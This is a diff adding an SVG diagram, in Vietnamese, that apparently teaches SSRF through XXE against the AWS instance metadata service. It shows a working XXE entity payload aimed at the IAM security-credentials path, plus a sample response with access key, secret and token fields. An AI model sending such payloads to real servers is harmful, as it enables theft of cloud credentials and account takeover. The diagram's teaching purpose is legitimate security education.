@@ -1,0 +1,87 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 950 480" width="100%" height="100%">
+  <defs>
+    <linearGradient id="bgGrad2" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#0d111a"/>
+      <stop offset="100%" stop-color="#161c28"/>
+    </linearGradient>
+    <linearGradient id="cardGrad2" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#1c2436"/>
+      <stop offset="100%" stop-color="#151a26"/>
+    </linearGradient>
+    <linearGradient id="cloudGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#ff9900"/>
+      <stop offset="100%" stop-color="#ff5500"/>
+    </linearGradient>
+  </defs>
+
+  <rect width="950" height="480" rx="16" fill="url(#bgGrad2)" stroke="#273142" stroke-width="2"/>
+  
+  <rect x="30" y="24" width="8" height="28" rx="4" fill="#ff9900"/>
+  <text x="50" y="45" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="20" font-weight="700" fill="#ffffff">Khai Thác SSRF Qua XXE: Chọc Vào Cloud Metadata</text>
+  <text x="50" y="70" font-family="-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif" font-size="13" fill="#8899ac">Lợi dụng máy chủ để truy cập địa chỉ IP liên kết cục bộ 169.254.169.254 và lấy IAM Role Token</text>
+
+  <!-- Attacker -->
+  <g transform="translate(40, 100)">
+    <rect width="250" height="340" rx="12" fill="url(#cardGrad2)" stroke="#303c54" stroke-width="1.5"/>
+    <rect x="0" y="0" width="250" height="40" rx="12" fill="#20293d"/>
+    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="600" fill="#79c0ff">1. Attacker (Client)</text>
+    
+    <rect x="15" y="55" width="220" height="265" rx="8" fill="#0d1117" stroke="#252d3d"/>
+    <text x="25" y="80" font-family="monospace" font-size="11" fill="#79c0ff">&lt;!ENTITY ssrf SYSTEM</text>
+    <text x="25" y="100" font-family="monospace" font-size="10" fill="#ff9900">&quot;http://169.254.169.254/</text>
+    <text x="25" y="118" font-family="monospace" font-size="10" fill="#ff9900">latest/meta-data/iam/</text>
+    <text x="25" y="136" font-family="monospace" font-size="10" fill="#ff9900">security-credentials/&quot;&gt;</text>
+    <text x="25" y="165" font-family="monospace" font-size="11" fill="#d2a8ff">&lt;stockCheck&gt;</text>
+    <text x="35" y="185" font-family="monospace" font-size="11" fill="#ff7b72">&lt;productId&gt;&amp;ssrf;&lt;/productId&gt;</text>
+    <text x="25" y="205" font-family="monospace" font-size="11" fill="#d2a8ff">&lt;/stockCheck&gt;</text>
+    
+    <rect x="25" y="235" width="200" height="70" rx="6" fill="#ff9900" opacity="0.15"/>
+    <text x="35" y="255" font-family="sans-serif" font-size="11" font-weight="700" fill="#ff9900">Mục tiêu tấn công:</text>
+    <text x="35" y="273" font-family="sans-serif" font-size="10" fill="#ffcb80">Địa chỉ mạng nội bộ AWS</text>
+    <text x="35" y="290" font-family="sans-serif" font-size="10" fill="#ffcb80">Mạng ngoài không thể chọc tới!</text>
+  </g>
+
+  <!-- Server -->
+  <g transform="translate(340, 100)">
+    <rect width="270" height="340" rx="12" fill="url(#cardGrad2)" stroke="#ff416c" stroke-width="1.5"/>
+    <rect x="0" y="0" width="270" height="40" rx="12" fill="#2d1c26"/>
+    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#ff416c">2. Web Server (EC2 Instance)</text>
+
+    <rect x="15" y="55" width="240" height="110" rx="8" fill="#121722" stroke="#252f44"/>
+    <text x="25" y="80" font-family="sans-serif" font-size="12" font-weight="600" fill="#e6edf3">XML Parser thực thi</text>
+    <text x="25" y="102" font-family="sans-serif" font-size="11" fill="#f85149">-> Nhìn thấy giao thức http://</text>
+    <text x="25" y="122" font-family="sans-serif" font-size="11" fill="#8899ac">-> Tự phát sinh HTTP GET nội bộ</text>
+    <text x="25" y="142" font-family="monospace" font-size="10" fill="#00ff87">GET http://169.254.169.254/...</text>
+
+    <rect x="15" y="180" width="240" height="140" rx="8" fill="#0d1117" stroke="#3d4960"/>
+    <text x="25" y="205" font-family="sans-serif" font-size="12" font-weight="600" fill="#79c0ff">Ứng dụng tin cậy Metadata</text>
+    <text x="25" y="228" font-family="sans-serif" font-size="10" fill="#8b949e">Bởi vì request xuất phát từ chính IP</text>
+    <text x="25" y="244" font-family="sans-serif" font-size="10" fill="#8b949e">của máy chủ (localhost/loopback),</text>
+    <text x="25" y="260" font-family="sans-serif" font-size="10" fill="#00ff87">AWS Metadata không hỏi mật khẩu!</text>
+    <text x="25" y="280" font-family="sans-serif" font-size="10" fill="#ffa657">-> Trả về IAM Role Keys!</text>
+  </g>
+
+  <!-- AWS Metadata Endpoint -->
+  <g transform="translate(660, 100)">
+    <rect width="250" height="340" rx="12" fill="url(#cardGrad2)" stroke="#ff9900" stroke-width="2"/>
+    <rect x="0" y="0" width="250" height="40" rx="12" fill="#302010"/>
+    <text x="20" y="25" font-family="sans-serif" font-size="13" font-weight="700" fill="#ff9900">3. AWS Metadata Service</text>
+
+    <rect x="15" y="55" width="220" height="265" rx="8" fill="#0a0f16" stroke="#332414"/>
+    <text x="25" y="78" font-family="monospace" font-size="10" fill="#ff9900">169.254.169.254/latest/</text>
+    <line x1="25" y1="90" x2="225" y2="90" stroke="#261b11"/>
+    
+    <text x="25" y="110" font-family="monospace" font-size="10" fill="#7ee787">HTTP/1.1 200 OK</text>
+    <text x="25" y="128" font-family="monospace" font-size="9" fill="#8b949e">{</text>
+    <text x="35" y="146" font-family="monospace" font-size="9" fill="#79c0ff">&quot;Code&quot;: &quot;Success&quot;,</text>
+    <text x="35" y="164" font-family="monospace" font-size="9" fill="#ffa657">&quot;AccessKeyId&quot;: &quot;ASIA...&quot;,</text>
+    <text x="35" y="182" font-family="monospace" font-size="9" fill="#ff7b72">&quot;SecretAccessKey&quot;: &quot;...&quot;,</text>
+    <text x="35" y="200" font-family="monospace" font-size="9" fill="#d2a8ff">&quot;Token&quot;: &quot;AQoDYXdz...&quot;</text>
+    <text x="25" y="218" font-family="monospace" font-size="9" fill="#8b949e">}</text>
+
+    <rect x="25" y="240" width="200" height="65" rx="6" fill="#ff416c" opacity="0.2"/>
+    <text x="35" y="260" font-family="sans-serif" font-size="11" font-weight="700" fill="#ff416c">HẬU QUẢ: CRITICAL</text>
+    <text x="35" y="278" font-family="sans-serif" font-size="10" fill="#ff99aa">Attacker chiếm trọn quyền</text>
+    <text x="35" y="294" font-family="sans-serif" font-size="10" fill="#ff99aa">toàn bộ tài khoản Cloud AWS!</text>
+  </g>
+</svg>
